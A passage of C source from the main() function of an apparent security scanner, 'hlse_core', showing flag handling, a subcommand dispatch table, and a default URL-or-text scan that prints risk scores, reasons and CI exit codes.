    if (g_baseline_file && hlse_baseline_load(g_baseline_file) != 0) {
        fprintf(stderr, "Error: cannot read --baseline file '%s': %s\n",
                g_baseline_file, strerror(errno));
        return 2;
    }
    /* Register cleanup once — covers every one of main()'s many return paths
     * uniformly (atexit failure just reverts to pre-fix behavior: a no-op). */
    if (g_baseline_file) atexit(hlse_baseline_clear);

    /* Open alert sinks now that flags are parsed. A requested but unopenable
     * --log-file is a usage error (same convention as --baseline/--patterns). */
    if ((opt_syslog || opt_log_file) &&
        hlse_alert_init(opt_syslog, opt_log_file) != 0) {
        fprintf(stderr, "Error: cannot open --log-file '%s': %s\n",
                opt_log_file ? opt_log_file : "(syslog only)", strerror(errno));
        return 2;
    }
    if (opt_syslog || opt_log_file) atexit(hlse_alert_shutdown);

    /* Quiet mode: redirect stdout to /dev/null. If the redirect fails we must
     * not silently keep printing — that would violate the quiet-mode contract
     * (callers rely on the exit code alone). Report and exit with usage error. */
    if (quiet && !json_out) {
        if (freopen("/dev/null", "w", stdout) == NULL) {
            fprintf(stderr, "Error: --quiet could not redirect stdout\n");
            return 2;
        }
    }

    if (strcmp(argv[idx], "-V") == 0 || strcmp(argv[idx], "--version") == 0) {
        printf("hlse_core %s (built %s)\n", HLSE_VERSION, HLSE_BUILD_DATE);
        return 0;
    }
    if (strcmp(argv[idx], "--self-test") == 0) {
        int rc1 = self_test();
        int rc2 = text_self_test();
        return rc1 || rc2 ? 1 : 0;
    }
    if (strcmp(argv[idx], "--list-patterns") == 0) {
        return list_patterns(json_out);
    }
    if (strcmp(argv[idx], "--benchmark") == 0) {
        return benchmark();
    }
    if (strcmp(argv[idx], "--stdin") == 0) {
        return stdin_mode(json_out);
    }
    if (strcmp(argv[idx], "-h") == 0 || strcmp(argv[idx], "--help") == 0) {
        print_usage(argv[0]);
        return 0;
    }

    /* ── scan subcommand ───────────────────────────────────────────────
     * Recursively scan a directory for secrets + file masquerade.
     * Designed for CI/CD pipelines:
     *   ./hlse_core scan /path/to/project
     *   exit 0 = clean, exit 1 = threats found                        */
    /* Flags are fully parsed by here; freeze them for the handlers. */
    opts.json_out  = json_out;
    opts.sarif_out = sarif_out;
    opts.quiet     = quiet;

    /* Subcommand dispatch. This was twelve near-identical strcmp/return pairs;
     * a table makes adding one a data change and keeps the list readable as a
     * list. The order is preserved from the chain it replaces — it does not
     * matter semantically, since the names are distinct, but keeping it makes
     * the diff reviewable.
     *
     * `protect` takes optional module flags (--ransomware|--smb|--mbr|--net);
     * without them it runs every module applicable to the path. */
    {
        static const struct {
            const char *name;
            int (*fn)(int argc, char **argv, int idx, const CliOpts *o);
        } COMMANDS[] = {
            { "scan",      cmd_scan      }, { "protect",   cmd_protect   },
            { "esp",       cmd_esp       }, { "package",   cmd_package   },
            { "paste",     cmd_paste     }, { "network",   cmd_network   },
            { "secret",    cmd_secret    }, { "email",     cmd_email     },
            { "clipboard", cmd_clipboard }, { "file",      cmd_file      },
            { "audit",     cmd_audit     }, { "text",      cmd_text      },
        };
        size_t ci;
        for (ci = 0; ci < sizeof(COMMANDS) / sizeof(COMMANDS[0]); ci++)
            if (strcmp(argv[idx], COMMANDS[ci].name) == 0)
                return COMMANDS[ci].fn(argc, argv, idx, &opts);
    }

    /* Default: use unified scan (auto-detects URL vs text) */
    {
        const char *input = argv[idx];

        /* Empty string → nothing to scan */
        if (!input || !input[0]) {
            fprintf(stderr, "Nothing to scan. Pass a URL or message.\n");
            return 2;
        }

        /* Sanitized display copy of the input for the plain-text echoes below.
         * The raw `input` still drives detection; only the terminal echo must
         * not carry attacker-supplied ANSI/control bytes (CWE-150). JSON uses
         * json_escape separately. Bounded to the max URL/host the scanner
         * handles; longer inputs are display-truncated, not scanned short. */
        char idisp[MAX_HOST + MAX_PATH + 16];
        snprintf(idisp, sizeof idisp, "%s", input);
        hlse_sanitize_terminal(idisp);

        /* Use unified scan API */
        ScanResult sr = hlse_scan(input);
        /* Push to alert sinks (--syslog/--log-file) if enabled — emitted from
         * the ScanResult so every output branch below is covered uniformly. */
        {
            const char *ar[16];
            int ai, an = sr.n_reasons;
            if (an > 16) an = 16;
            for (ai = 0; ai < an; ai++) ar[ai] = sr.reasons[ai];
            hlse_alert_emit(sr.is_url ? "url" : "text", sr.score,
                            hlse_severity_for_score(sr.score), input, ar, an);
        }
        if (json_out) {
            /* For JSON, delegate to the appropriate printer. For text
             * inputs use the ScanResult directly (not hlse_check_text
             * alone) so embedded URL extraction is honoured. */
            if (sr.is_url) {
                Verdict uv = check_url(input);
                print_json_url(input, &uv);
            } else {
                TextVerdict tv;
                text_verdict_from_scan(&tv, &sr);
                print_json_text(input, &tv);
            }
        } else if (sr.score == 0) {
            /* Channel-only risk: content scored 0 but delivery channel adds prior */
            if (g_from_channel) {
                int d = channel_delta(g_from_channel);
                if (d > 0) {
                    const char *ch_rsn = channel_reason(g_from_channel);
                    const char *bs2 = hlse_blindspot_for(sr.is_url ? "url" : "text");
                    printf("%-7s [%d]  %s\n", hlse_action_for_score(d), d, idisp);
                    if (ch_rsn) printf("  \xc2\xb7 %s\n", ch_rsn);
                    if (bs2) printf("  \xe2\x84\xb9 Blind spot: %s\n", bs2);
                    {
                        int eff_gate = d;
                        return eff_gate >= g_fail_threshold ? 1 : 0;
                    }
                }
            }
            {
                char canon_brand[64];
                int has_c = sr.is_url &&
                            hlse_canonical_confirm(input, canon_brand, sizeof(canon_brand));
                const char *bs = hlse_blindspot_for(
                    has_c ? "url_canonical" : (sr.is_url ? "url" : "text"));
                printf("OK    %s\n", idisp);
                if (has_c)
                    printf("  \xe2\x9c\x94 Canonical: confirmed authentic %s domain "
                           "(HLSE brand registry)\n", canon_brand);
                if (bs) printf("  \xe2\x84\xb9 Blind spot: %s\n", bs);
            }
        } else {
            int i;
            int eff = sr.score;
            const char *ch_rsn = NULL;
            if (g_from_channel) {
                int d = channel_delta(g_from_channel);
                eff += d; if (eff > 100) eff = 100;
                ch_rsn = channel_reason(g_from_channel);
            }
            printf("%-7s [%d]  %s\n",
                   hlse_action_for_score(eff), eff, idisp);
            for (i = 0; i < sr.n_reasons; i++) {
                if (strncmp(sr.reasons[i], "Amplifier:", 10) == 0) continue;
                printf("  \xc2\xb7 %s\n", sr.reasons[i]);
            }
            if (sr.is_url) {
                /* Re-run URL check to get a Verdict for pattern synthesis.
                 * hlse_scan already ran this internally; the cost is low.  */
                Verdict uv = check_url(input);
                const char *ex = hlse_url_exoneration(&uv);
                print_url_advisories(input, &uv);
                if (ch_rsn) printf("  \xc2\xb7 %s\n", ch_rsn);
                if (ex) printf("  \xe2\x86\xba Could be benign: %s\n", ex);
            } else {
                TextVerdict tv;
                const char *ex;
                text_verdict_from_scan(&tv, &sr);
                ex   = hlse_text_exoneration(&tv);
                print_text_advisories(&tv);
                if (ch_rsn) printf("  \xc2\xb7 %s\n", ch_rsn);
                if (ex) printf("  \xe2\x86\xba Could be benign: %s\n", ex);
            }
        }
        /* Gate uses effective score so --from boost is honoured in exit code. */
        {
            int eff_gate = sr.score;
            if (g_from_channel) {
                int d = channel_delta(g_from_channel);
                eff_gate += d; if (eff_gate > 100) eff_gate = 100;
            }
            return eff_gate >= g_fail_threshold ? 1 : 0;
        }
    }
}
